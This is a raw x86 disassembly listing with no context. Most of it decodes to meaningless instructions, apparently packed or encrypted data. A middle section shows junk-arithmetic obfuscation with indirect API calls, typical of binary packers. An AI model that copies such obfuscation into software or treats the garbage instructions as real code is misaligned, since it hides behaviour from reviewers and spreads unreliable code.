  4032fb:	shl    eax,cl
  4032fd:	neg    si
  403300:	pop    esi
  403301:	lahf   
  403302:	push   eax
  403303:	adc    bh,BYTE PTR [ecx]
  403305:	cmp    al,0x58
  403307:	push   edi
  403308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403309:	adc    DWORD PTR [esi-0x3f1d7aac],0xf3b2d2ec
  403313:	mov    bl,bh
  403315:	adc    ah,BYTE PTR [ebp+0x165f945a]
  40331b:	icebp  
  40331c:	sub    edi,DWORD PTR [edx+0xca3f4a3]
  403322:	int3   
  403323:	popf   
  403324:	call   FWORD PTR [ecx+0x72]
  403327:	and    ebx,esp
  403329:	inc    ecx
  40332a:	fld    DWORD PTR [esi-0x77]
  40332d:	mov    DWORD PTR [edi],0xaa8e5389
  403333:	add    DWORD PTR [esi+0x45b8a8f],ebx
  403339:	mov    eax,ebx
  40333b:	mov    dh,0x42
  40333d:	loopne 0x4033bc
  40333f:	nop
  403340:	arpl   WORD PTR [edi+0x2ab267a3],bx
  403346:	add    esp,DWORD PTR [eax-0x2397c394]
  40334c:	xchg   edi,eax
  40334d:	lods   eax,DWORD PTR ds:[esi]
  40334e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40334f:	or     BYTE PTR [ecx+0x62],cl
  403352:	or     al,0xf0
  403354:	call   0xbf8548cc
  403359:	cmp    BYTE PTR [ebx+0x7885bd11],dl
  40335f:	xor    DWORD PTR [esi],eax
  403361:	mov    eax,0xd67c06f
  403366:	jae    0x4033af
  403368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403369:	test   eax,0xe7992ca8
  40336e:	xchg   edx,eax
  40336f:	dec    ebp
  403370:	cli    
  403371:	push   cs
  403372:	aaa    
  403373:	push   edi
  403374:	aaa    
  403375:	xchg   edx,eax
  403376:	mov    ds:0xbaee9f5f,al
  40337b:	mov    edx,0x35082287
  403380:	jecxz  0x40330f
  403382:	or     dl,bh
  403384:	mul    DWORD PTR [edx]
  403386:	data16 xor BYTE PTR [edi],0xb
  40338a:	(bad)  
  40338b:	loopne 0x403332
  40338d:	test   al,0x3b
  40338f:	arpl   WORD PTR [edi],bp
  403391:	or     eax,0xb6e19ac6
  403396:	mov    dh,0xcd
  403398:	mov    bl,0xdd
  40339a:	rcr    BYTE PTR ss:[edx+0x193655fe],0x8f
  4033a2:	pushf  
  4033a3:	test   DWORD PTR [ebx+0x51064071],0xd97de812
  4033ad:	aaa    
  4033ae:	into   
  4033af:	dec    edi
  4033b0:	jmp    0x403412
  4033b2:	cmp    cl,BYTE PTR [eax-0x7589bd53]
  4033b8:	sbb    al,0x57
  4033ba:	fstp   DWORD PTR [esp+ebx*8-0x129a5f6f]
  4033c1:	sbb    edx,DWORD PTR es:[edi]
  4033c4:	pop    ds
  4033c5:	pop    eax
  4033c6:	stc    
  4033c7:	or     dl,al
  4033c9:	mov    cl,0xd0
  4033cb:	or     BYTE PTR [edx-0x74],ah
  4033ce:	add    al,0x50
  4033d0:	cmp    ebp,DWORD PTR [eax+0x52]
  4033d3:	mov    cl,0x4f
  4033d5:	inc    ebp
  4033d6:	ja     0x4033d2
  4033d8:	data16 xlat BYTE PTR ds:[ebx]
  4033da:	mov    edx,0x7bf345c
  4033df:	mov    ch,0xb3
  4033e1:	lahf   
  4033e2:	sbb    DWORD PTR [ebx],ecx
  4033e4:	mov    esp,esi
  4033e6:	mov    dh,0x3e
  4033e8:	xlat   BYTE PTR ds:[ebx]
  4033e9:	jns    0x4033cd
  4033eb:	fdivrp st(4),st
  4033ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033ee:	push   edi
  4033ef:	mov    eax,ds:0xefca953c
  4033f4:	sub    DWORD PTR [ecx],ebx
  4033f6:	cmp    eax,0x642ed185
  4033fb:	mov    bh,0x73
  4033fd:	jecxz  0x4033fd
  4033ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403400:	mov    dl,0x95
  403402:	cmc    
  403403:	sub    sp,cx
  403406:	lods   eax,DWORD PTR ds:[esi]
  403407:	ss leave 
  403409:	(bad)  
  40340b:	dec    edx
  40340c:	ret    
  40340d:	jbe    0x403485
  40340f:	rcr    DWORD PTR [ecx+0x1d92edc9],cl
  403415:	add    edi,DWORD PTR ds:0x796c2f09
  40341c:	fmul   DWORD PTR [ebp-0x7b]
  40341f:	and    DWORD PTR ds:0x93d47b78,esp
  403425:	jge    0x40346d
  403427:	cmp    DWORD PTR [ebx],eax
  403429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40342a:	inc    edx
  40342b:	add    ah,BYTE PTR [ebx+0x2430da1]
  403431:	cmp    al,0xe5
  403433:	daa    
  403434:	sub    esp,DWORD PTR es:[edx-0x6d]
  403438:	dec    eax
  403439:	aam    0xf3
  40343b:	jg     0x40347c
  40343d:	sar    BYTE PTR [esi+esi*8-0x17],0x68
  403442:	fisub  DWORD PTR [eax-0x58c4e4d9]
  403448:	scas   al,BYTE PTR es:[edi]
  403449:	cld    
  40344a:	ds jbe 0x403443
  40344d:	test   dl,bh
  40344f:	sbb    eax,0xdc6d2caf
  403454:	xchg   ebp,eax
  403455:	scas   al,BYTE PTR es:[edi]
  403456:	hlt    
  403457:	leave  
  403458:	mov    esi,0xd7eddb50
  40345d:	outs   dx,BYTE PTR ds:[esi]
  40345e:	cli    
  40345f:	pop    edx
  403460:	into   
  403461:	stos   DWORD PTR es:[edi],eax
  403462:	frstor [ebx]
  403464:	jnp    0x40347a
  403466:	add    si,cx
  403469:	stos   BYTE PTR es:[edi],al
  40346a:	adc    DWORD PTR [esi-0x2a59480a],ecx
  403470:	(bad)  
  403471:	stc    
  403472:	or     esi,DWORD PTR [edi]
  403474:	sub    eax,0xf3683382
  403479:	loop   0x4034d4
  40347b:	mov    eax,0xa2167387
  403480:	mov    eax,0xcbfaf4dc
  403485:	inc    ebx
  403486:	cli    
  403487:	nop
  403488:	jnp    0x4034fc
  40348a:	ret    
  40348b:	(bad)  
  40348d:	mov    ch,0x19
  40348f:	inc    ecx
  403490:	ss cld 
  403492:	dec    ecx
  403493:	clc    
  403494:	and    eax,0x58a8bfde
  403499:	adc    ch,cl
  40349b:	or     al,0x55
  40349d:	adc    DWORD PTR [ebx+0x1e],ebp
  4034a0:	mov    ds:0xb5d9c13a,al
  4034a5:	mov    bh,0x3a
  4034a7:	stc    
  4034a8:	xchg   ecx,eax
  4034a9:	sub    cl,cl
  4034ab:	pop    es
  4034ac:	push   ebp
  4034ad:	jl     0x403457
  4034af:	and    al,0xc3
  4034b1:	xchg   edi,eax
  4034b2:	pop    esp
  4034b3:	mov    edi,0xa44f0fe2
  4034b8:	push   0x2d2c7392
  4034bd:	(bad)  
  4034be:	xor    ebp,DWORD PTR [edi+0x3d254c9f]
  4034c4:	mov    BYTE PTR [ebp+0x19],dh
  4034c7:	ficom  WORD PTR [edx-0x6f]
  4034ca:	dec    esp
  4034cb:	lods   eax,DWORD PTR ds:[esi]
  4034cc:	xchg   ecx,eax
  4034cd:	pop    ebx
  4034ce:	mov    dl,0xcf
  4034d0:	xor    al,0xec
  4034d2:	(bad)  
  4034d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034d5:	ret    
  4034d6:	and    eax,0x38dac0fe
  4034db:	cmp    esi,DWORD PTR [eax-0x3f]
  4034de:	jg     0x4034e0
  4034e0:	jnp    0x4034ef
  4034e2:	sbb    esi,esi
  4034e4:	and    eax,0x8b40b628
  4034e9:	dec    esi
  4034ea:	ss (bad) 
  4034ec:	or     cl,BYTE PTR [ebx+0x13bec4d]
  4034f2:	mov    DWORD PTR ds:0x428123,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx+0x3a],ch
  403514:	sti    
  403515:	fstp   TBYTE PTR [esi-0x3d]
  403518:	in     eax,0x18
  40351a:	sbb    BYTE PTR [esi-0x9e7e7ee],bl
  403520:	(bad)  
  403521:	sub    ecx,edi
  403523:	push   cs
  403524:	std    
  403525:	sub    BYTE PTR [edx-0x3f],bh
  403528:	jbe    0x403557
  40352a:	or     eax,0x71c44855
  40352f:	ins    BYTE PTR es:[edi],dx
  403530:	adc    eax,DWORD PTR [ecx+0x2ef7154c]
  403536:	pop    edi
  403537:	test   al,0x43
  403539:	lods   eax,DWORD PTR ds:[esi]
  40353a:	mov    ch,0x76
  40353c:	push   eax
  40353d:	or     al,0x1f
  40353f:	ror    BYTE PTR [edi],cl
  403541:	iret   
  403542:	jg     0x4034cb
  403544:	adc    BYTE PTR cs:0xb812a389,0x2c
  40354c:	cwde   
  40354d:	or     eax,DWORD PTR [ecx-0x48]
  403550:	retf   
  403551:	xchg   ebp,eax
  403552:	test   esi,ecx
  403554:	ins    DWORD PTR es:[edi],dx
  403555:	in     eax,dx
  403556:	cwde   
  403557:	mov    al,ds:0xe239231d
  40355c:	in     al,0x23
  40355e:	popa   
  40355f:	std    
  403560:	cmp    DWORD PTR [eax],edi
  403562:	adc    BYTE PTR [edx],ch
  403564:	adc    BYTE PTR [eax*8-0x743f0a37],dl
  40356b:	push   ss
  40356c:	mov    BYTE PTR [ebx+eax*8],ch
  40356f:	adc    dl,0xe9
  403572:	dec    ebx
  403573:	xchg   DWORD PTR [esi+0x5],esi
  403576:	lock fwait
  403578:	mov    ecx,0x7fda2ec0
  40357d:	mov    esi,0x8b04db7f
  403582:	es xchg ebp,eax
  403584:	and    dx,ax
  403587:	cmc    
  403588:	mov    al,0xdc
  40358a:	pop    ebx
  40358b:	sub    DWORD PTR [ecx-0x51c1159f],ebp
  403591:	and    al,dl
  403593:	popf   
  403594:	pop    ds
  403595:	add    BYTE PTR [eax],dl
  403597:	push   edi
  403598:	div    DWORD PTR [edx-0x5d]
  40359b:	or     dl,BYTE PTR [ebp+ebp*4-0x2fd739b9]
  4035a2:	test   BYTE PTR ds:0x19ca495,0x35
  4035a9:	imul   edx,DWORD PTR [eax+edx*2-0x5b72287b],0x7b
  4035b1:	sub    eax,ebp
  4035b3:	daa    
  4035b4:	int3   
  4035b5:	das    
  4035b6:	pop    ecx
  4035b7:	xchg   BYTE PTR [ebx+0x1a],al
  4035ba:	mov    ebp,0x76056022
  4035bf:	or     al,0xe7
  4035c1:	in     eax,0x48
  4035c3:	clc    
  4035c4:	int    0xb5
  4035c6:	call   0xc059:0x71faf4c8
  4035cd:	enter  0x324f,0xb4
  4035d1:	sub    ah,BYTE PTR ds:0xe600227e
  4035d7:	adc    ah,bh
  4035d9:	dec    ebp
  4035da:	aas    
  4035db:	inc    edx
  4035dc:	sub    eax,0xaf832f95
  4035e1:	xor    edx,DWORD PTR [esi+ecx*8]
  4035e4:	shl    BYTE PTR [edx+0x6b0381ca],cl
  4035ea:	ins    DWORD PTR es:[edi],dx
  4035eb:	adc    bh,BYTE PTR [ebp+0x6bb7f8ba]
  4035f1:	dec    edx
  4035f2:	inc    eax
  4035f3:	jbe    0x403621
  4035f5:	ins    BYTE PTR es:[edi],dx
  4035f6:	lock sar BYTE PTR [ebp+0x3],0x48
  4035fb:	aas    
  4035fc:	mov    al,0x34
  4035fe:	mov    bl,0x0
  403600:	mov    ds:0x9ce36a87,al
  403605:	push   ebx
  403606:	sti    
  403607:	mov    al,0xf4
  403609:	popf   
  40360a:	jmp    0xbe43:0x26bc97b0
  403611:	xor    al,0x7a
  403613:	pop    ebx
  403614:	cmp    eax,DWORD PTR [esi]
  403616:	add    BYTE PTR [esi+0x390bd287],bl
  40361c:	cwde   
  40361d:	sub    BYTE PTR [esp+edi*1],dh
  403620:	int    0x6
  403622:	pop    ebx
  403623:	and    BYTE PTR [eax-0x408aa777],cl
  403629:	cmp    eax,0x5c813132
  40362e:	ja     0x403681
  403630:	inc    edi
  403631:	pop    ds
  403632:	ja     0x40362a
  403634:	mov    BYTE PTR [ecx],dh
  403636:	adc    al,0xb8
  403638:	call   0xbdf8:0xb14adc5f
  40363f:	jge    0x40360d
  403641:	sbb    BYTE PTR [esi],dl
  403643:	ret    
  403644:	aas    
  403645:	mov    ah,0x45
  403647:	retf   
  403648:	sub    ebp,DWORD PTR [ebp-0xe]
  40364b:	lds    ebx,FWORD PTR [esi+0x2b]
  40364e:	loop   0x403621
  403650:	mov    ebp,0xad1ad0e1
  403655:	cmp    al,0x87
  403657:	out    dx,eax
  403658:	imul   esi,DWORD PTR es:[edx],0xffffffd1
  40365c:	and    ebx,DWORD PTR [esp+esi*2]
  40365f:	push   esi
  403660:	mov    es,WORD PTR [ebp-0x515de26d]
  403666:	add    eax,0x3348c669
  40366b:	mov    ebp,0xe076548d
  403670:	shl    DWORD PTR [eax],1
  403672:	shr    BYTE PTR [esi-0x22d871b7],cl
  403678:	lahf   
  403679:	mov    ebp,0x9bdaa8c2
  40367e:	cdq    
  40367f:	(bad)  
  403680:	in     al,0x7
  403682:	xor    eax,0xa6e15345
  403687:	add    eax,0xbe9d1dbf
  40368c:	pop    ebp
  40368d:	mov    edx,ebx
  40368f:	inc    esp
  403690:	dec    ebp
  403691:	mov    gs:0x6331848b,al
  403697:	pushf  
  403698:	setle  BYTE PTR [edi]
  40369b:	das    
  40369c:	mov    al,ds:0xafdaa58e
  4036a1:	and    BYTE PTR [edi+0x5b],bl
  4036a4:	push   0x51
  4036a6:	xor    ch,BYTE PTR [esp+ebx*4+0x345dcf00]
  4036ad:	pop    ecx
  4036ae:	cmp    eax,0x3e1ab623
  4036b3:	fidiv  DWORD PTR [edi+0x1fbb8797]
  4036b9:	xor    esi,DWORD PTR [esi+0x6f]
  4036bc:	add    eax,0xb18d3133
  4036c1:	scas   eax,DWORD PTR es:[edi]
  4036c2:	cmp    eax,0x4449a625
  4036c7:	ss ja  0x4036cf
  4036ca:	xlat   BYTE PTR ds:[ebx]
  4036cb:	(bad)  
  4036cc:	std    
  4036cd:	mov    ds:0xdbcdcb5e,al
  4036d2:	test   dl,dl
  4036d4:	jmp    0x7291d152
  4036d9:	add    BYTE PTR [ebx+0x5],ah
  4036dc:	rcl    BYTE PTR [ecx-0xa],cl
  4036df:	or     eax,0x7ebb384
  4036e4:	sahf   
  4036e5:	lea    ebp,[esi]
  4036e7:	lahf   
  4036e8:	sbb    eax,0x316b1d65
  4036ed:	xor    DWORD PTR [esi-0x76589c08],ebx
  4036f3:	jne    0x4036c3
  4036f5:	push   ebp
  4036f6:	mov    ?,edx
  4036f8:	retf   
  4036f9:	aaa    
  4036fa:	jne    0x403771
  4036fc:	or     bh,BYTE PTR [eax+0x65]
  4036ff:	push   ecx
  403700:	mov    cl,0xa9
  403702:	popa   
  403703:	jne    0x4036e7
  403705:	(bad)  
  403706:	fwait
  403707:	xor    BYTE PTR [ebp+0x23d220f2],dh
  40370d:	jns    0x4036a5
  40370f:	sbb    al,0xe2
  403711:	sub    DWORD PTR [ecx-0x28],ebx
  403714:	test   BYTE PTR [eax],0x55
  403717:	inc    eax
  403718:	mov    BYTE PTR [ebx],bl
  40371a:	outs   dx,BYTE PTR ds:[esi]
  40371b:	sahf   
  40371c:	adc    ch,0x3d
  40371f:	popf   
  403720:	mov    ebx,0x49b53cc
  403725:	jnp    0x403753
  403727:	pop    bx
  403729:	div    eax
  40372b:	jmp    0x1a9c:0xb56565e0
  403732:	jecxz  0x4036ee
  403734:	mov    al,0x90
  403736:	mov    eax,0xc3e9455c
  40373b:	dec    eax
  40373c:	clc    
  40373d:	rol    BYTE PTR [edi],cl
  40373f:	shl    DWORD PTR [eax],1
  403741:	sti    
  403742:	icebp  
  403743:	loope  0x40378b
  403745:	neg    DWORD PTR [edi+0x5f3914cf]
  40374b:	loopne 0x403730
  40374d:	or     eax,0xd44e23d1
  403752:	cmp    esp,DWORD PTR [ebx]
  403754:	inc    ecx
  403755:	and    cl,dl
  403757:	out    dx,al
  403758:	inc    ecx
  403759:	cmp    ah,BYTE PTR [eax+0x67a721d2]
  40375f:	ds mov bl,al
  403762:	popf   
  403763:	ds pop edi
  403765:	mov    esp,ds
  403767:	cld    
  403768:	hlt    
  403769:	je     0x403790
  40376b:	and    ch,ah
  40376d:	fcomi  st,st(3)
  40376f:	mov    BYTE PTR [esi],0xbf
  403772:	and    cl,bh
  403774:	sub    edx,DWORD PTR [ebx-0x9]
  403777:	mov    BYTE PTR [ebx+ebp*8],ch
  40377a:	cmp    ah,0xb
  40377d:	sub    al,0xd2
  40377f:	or     eax,0xffffffc9
  403782:	repnz xor ah,BYTE PTR [ebx]
  403785:	jns    0x403725
  403787:	fsubrp st(5),st
  403789:	cmp    bh,BYTE PTR [eax]
  40378b:	mov    bl,0xc5
  40378d:	fcom   QWORD PTR ds:0x620656ba
  403793:	mov    esi,0x6418206a
  403798:	jmp    0x73c34166
  40379d:	sbb    bl,BYTE PTR [edx-0x7481c753]
  4037a3:	lahf   
  4037a4:	and    cl,bh
  4037a6:	repz mov dl,0xb
  4037a9:	ret    
  4037aa:	inc    ecx
  4037ab:	push   edi
  4037ac:	lds    edi,FWORD PTR [ecx+0x2e]
  4037af:	push   es
  4037b0:	test   BYTE PTR [ebx-0x68],0x2b
  4037b4:	call   0x842f0dbd
  4037b9:	test   eax,0xc6472a3c
  4037be:	pop    eax
  4037bf:	loop   0x403792
  4037c1:	out    dx,eax
  4037c2:	sti    
  4037c3:	add    DWORD PTR [esi],edi
  4037c5:	mov    DWORD PTR [edx+ebp*8],eax
  4037c8:	in     eax,dx
  4037c9:	push   esp
  4037ca:	sbb    edi,edi
  4037cc:	or     esp,DWORD PTR [edx-0x17]
  4037cf:	mov    edx,0x32820818
  4037d4:	shl    BYTE PTR [esi+ebp*8],cl
  4037d7:	jmp    FWORD PTR [eax-0x70889146]
  4037dd:	inc    ebp
  4037de:	fwait
  4037df:	pop    ebx
  4037e0:	xchg   ebx,eax
  4037e1:	in     eax,0xf7
  4037e3:	xor    edx,DWORD PTR [ebp+0x1a]
  4037e6:	inc    edx
  4037e7:	jbe    0x403851
  4037e9:	ja     0x4037ec
  4037eb:	in     eax,dx
  4037ec:	in     al,dx
  4037ed:	cld    
  4037ee:	jl     0x40385e
  4037f0:	sbb    al,0x65
  4037f2:	bnd jae 0x4037d4
  4037f5:	and    ebp,DWORD PTR [esi+eiz*8+0x701610e]
  4037fc:	sti    
  4037fd:	loop   0x403785
  4037ff:	enter  0xd8a8,0xa4
  403803:	mov    edi,0x6ba88de8
  403808:	out    dx,eax
  403809:	push   edx
  40380a:	or     DWORD PTR [esi-0x1b18a224],eax
  403810:	xor    DWORD PTR [edi],0xcaa7f179
  403816:	mov    al,ds:0x9b096bb1
  40381b:	fidiv  DWORD PTR [esi-0x10be451d]
  403821:	mov    ebp,0x3547f254
  403826:	test   eax,ebp
  403828:	mov    cl,0x99
  40382a:	jmp    0x63fc43e
  40382f:	push   0xffffffb8
  403831:	mov    ebx,0x8f5acafd
  403836:	jp     0x4037d2
  403838:	dec    esp
  403839:	add    bh,BYTE PTR [edi-0x12]
  40383c:	push   es
  40383d:	hlt    
  40383e:	pop    ebp
  40383f:	jmp    0xdca2:0x76946406
  403846:	sbb    eax,0x975632ef
  40384b:	mov    eax,0xc28579f7
  403850:	rol    edi,1
  403852:	aam    0xe4
  403854:	mov    ecx,0x66698644
  403859:	adc    DWORD PTR [eax-0x73],ecx
  40385c:	popf   
  40385d:	jnp    0x4037fd
  40385f:	cdq    
  403860:	mov    ds:0x2025dcb1,al
  403865:	push   cs
  403866:	add    eax,0x3ed62406
  40386b:	xchg   esp,eax
  40386c:	lods   al,BYTE PTR ds:[esi]
  40386d:	pop    ebp
  40386e:	arpl   WORD PTR [edi+ecx*8-0x65c65eb3],bp
  403875:	daa    
  403876:	jmp    0x20ba:0x39ae1c46
  40387d:	in     al,0x2f
  40387f:	or     edx,edx
  403881:	int    0x69
  403883:	in     eax,dx
  403884:	mov    ecx,0xc755943d
  403889:	push   cs
  40388a:	in     eax,dx
  40388b:	loop   0x403858
  40388d:	or     BYTE PTR [esi],0x4b
  403890:	es sbb al,0x73
  403893:	icebp  
  403894:	mov    esp,0xc1d01345
  403899:	mov    ebp,0x650e60a0
  40389e:	mov    dh,0xf2
  4038a0:	mov    ebp,0xb4412756
  4038a5:	inc    esp
  4038a6:	fsubrp st(3),st
  4038a8:	add    bh,bl
  4038aa:	dec    ecx
  4038ab:	es xchg ecx,eax
  4038ad:	jbe    0x4038cc
  4038af:	imul   ecx,DWORD PTR [esi+eiz*1-0x6b2a490f],0x26b48a8a
  4038ba:	rol    BYTE PTR [ebx+0x676090cc],1
  4038c0:	jmp    FWORD PTR [eax-0x21d0c6c3]
  4038c6:	pushf  
  4038c7:	push   es
  4038c8:	pop    esp
  4038c9:	inc    edx
  4038ca:	sub    cl,BYTE PTR [edx-0x67]
  4038cd:	ja     0x4038c8
  4038cf:	and    al,0x59
  4038d1:	jno    0x403913
  4038d3:	cmp    eax,0xf9340049
  4038d8:	xchg   ecx,eax
  4038d9:	push   ebp
  4038da:	(bad)  
  4038db:	je     0x40386f
  4038dd:	mov    dh,0xda
  4038df:	sbb    eax,0x83f4458b
  4038e4:	cmp    eax,0x428223
  4038e9:	add    bh,dh
  4038eb:	adc    eax,0x42811b
  4038f0:	mov    ecx,DWORD PTR ds:0x428247
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x428223,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428e98
  403913:	xor    edx,DWORD PTR ds:0x42820f
  403919:	neg    DWORD PTR ds:0x428223
  40391f:	xor    DWORD PTR ds:0x428117,0x12a5
  403929:	and    DWORD PTR ds:0x428367,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x42824b
  403939:	or     ecx,DWORD PTR ds:0x4281ff
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x428123,0x0
  403949:	mov    DWORD PTR ds:0x428367,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x428123,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428d6c
  40397f:	adc    DWORD PTR ds:0x428257,0x42813f
  403989:	sbb    DWORD PTR ds:0x428243,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x428343
  403999:	or     DWORD PTR ds:0x42821f,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x428247
  4039a7:	adc    edx,DWORD PTR ds:0x42822b
  4039ad:	mov    DWORD PTR ds:0x428247,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x4281ff,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x428267,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x42825b,0x428367
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x42813b
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x428117,0x4282df
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x428123,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x42811b,0x4282b3
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x42822f,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x428247,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x428117,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x428243,0x0
  403a3e:	mov    DWORD PTR ds:0x4282cf,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x428367
  403a57:	cmp    DWORD PTR ds:0x428243,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428d48
  403a6f:	mov    edx,DWORD PTR ds:0x4282ff
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x428393
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x428143,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x428137,0x2089
  403aa2:	or     DWORD PTR ds:0x42811b,0x113b
  403aac:	mov    eax,ds:0x422390
  403ab1:	cmp    DWORD PTR ds:0x428143,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x42820f
  403ac3:	mov    DWORD PTR ds:0x4281f3,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x4282e3,0x6b1a
  403adc:	mov    DWORD PTR ds:0x428143,0x1226
  403ae6:	cmp    DWORD PTR ds:0x428143,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x4280e3
  403af8:	call   DWORD PTR ds:0x428d70
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x42820b,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x42824f,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x42833b,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x42812b,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0xb0af2ecd
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi-0x4ee7e7ee],bl
  403b4b:	test   DWORD PTR [esi+0x31],esi
  403b4e:	int    0x7a
  403b50:	push   esp
  403b51:	jb     0x403b29
  403b53:	mov    dl,bl
  403b55:	out    0xc7,al
  403b57:	daa    
  403b58:	xchg   ah,dl
  403b5a:	hlt    
  403b5b:	(bad)  
  403b5c:	push   cs
  403b5d:	mov    ecx,0xd8df846
  403b62:	and    al,0x25
  403b64:	mov    ah,0x43
  403b66:	cmp    BYTE PTR [ebp+0x1b],bh
  403b69:	adc    esp,DWORD PTR [edi+ecx*1]
  403b6c:	dec    edx
  403b6d:	repnz mov eax,ds:0x4e9a7049
  403b73:	sbb    al,0xd2
  403b75:	xor    al,0xd4
  403b77:	cli    
  403b78:	inc    edi
  403b79:	pop    esi
  403b7a:	call   0x1114:0x91068627
  403b81:	mov    bh,0x5c
  403b83:	sub    dh,cl
  403b85:	jecxz  0x403b7b
  403b87:	fs mov cl,0x93
  403b8a:	cwde   
  403b8b:	push   edi
  403b8c:	mov    ecx,0x46ba8c63
  403b91:	add    edi,DWORD PTR ds:0x45da3856
  403b97:	mov    eax,ds:0xe50e26f9
  403b9c:	cmp    esp,eax
  403b9e:	inc    edx
  403b9f:	push   edx
  403ba0:	sbb    dh,BYTE PTR [ecx]
  403ba2:	pusha  
  403ba3:	jge    0x403c21
  403ba5:	scas   al,BYTE PTR es:[edi]
  403ba6:	cmc    
  403ba7:	or     DWORD PTR [ebx+0x1934b536],0x5ea7f7e9
  403bb1:	in     eax,0x7a
  403bb3:	in     al,dx
  403bb4:	outs   dx,BYTE PTR ds:[esi]
  403bb5:	xchg   edi,eax
  403bb6:	push   edx
  403bb7:	addr16 dec ebp
  403bb9:	xor    eax,0x3d9fa4a7
  403bbe:	mov    al,ds:0x47d735cd
  403bc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bc4:	outs   dx,BYTE PTR ds:[esi]
  403bc5:	jge    0x403c0b
  403bc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bc8:	pop    ebp
  403bc9:	push   cs
  403bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bcb:	xchg   bl,bh
  403bcd:	sbb    cl,BYTE PTR [eax]
  403bcf:	lods   eax,DWORD PTR ds:[esi]
  403bd0:	cmc    
  403bd1:	into   
  403bd2:	jno    0x403b6e
  403bd4:	pop    ebx
  403bd5:	dec    esp
  403bd6:	dec    eax
  403bd7:	or     BYTE PTR [eax],cl
  403bd9:	rol    BYTE PTR [ebx-0x3],1
  403bdc:	inc    ebp
  403bdd:	jp     0x403bdf
  403bdf:	cmp    al,0xfc
  403be1:	xchg   edi,eax
  403be2:	lods   al,BYTE PTR ds:[esi]
  403be3:	push   ebx
  403be4:	nop
  403be5:	loopne 0x403c17
  403be7:	enter  0xe865,0xb3
  403beb:	rol    DWORD PTR [eax],0x7d
  403bee:	jl     0x403bf1
  403bf0:	pop    es
  403bf1:	enter  0x6a32,0x6
  403bf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bf6:	pop    edx
  403bf7:	inc    edi
  403bf8:	push   ds
  403bf9:	pop    ebp
  403bfa:	and    eax,0x6140a8bd
  403bff:	ret    0x6138
  403c02:	jnp    0x403c04
  403c04:	cmp    DWORD PTR [esi],ebp
  403c06:	int3   
  403c07:	or     BYTE PTR [edx-0x57],bl
